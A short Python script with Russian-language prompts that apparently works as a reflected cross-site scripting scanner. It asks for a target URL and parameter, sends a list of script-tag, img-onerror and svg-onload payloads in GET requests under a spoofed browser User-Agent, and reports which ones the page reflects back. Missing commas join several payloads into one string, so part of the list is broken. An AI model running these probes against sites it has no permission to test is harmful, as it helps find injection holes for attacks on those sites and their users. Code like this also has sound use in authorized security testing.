import requests
import urllib.parse

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>"
    "<img/src/onerror=prompt(8)>"
    "<image src/onerror=prompt(8)>"
    "<img src/onerror=prompt(8)>"
    "<image src =q onerror=prompt(8)>"
    "<img src =q onerror=prompt(8)>"
    "</scrip</script>t><img src =q onerror=prompt(8)>"
    
]

headers = {
    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
}

url = input("Введите url (например, https://example.com): ").strip()
param = input("Выбери имя параметра(например, q): ").strip()

print("\nПроверка на xss")

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{param}={encoded_payload}"

    try:
        response = requests.get(test_url, headers=headers)
        if payload in response.text:
            print(f"Сработал {payload}")
        else:
            print(f"не сработал {payload}")
    except Exception as e:
        print(f"ошибка {e}")
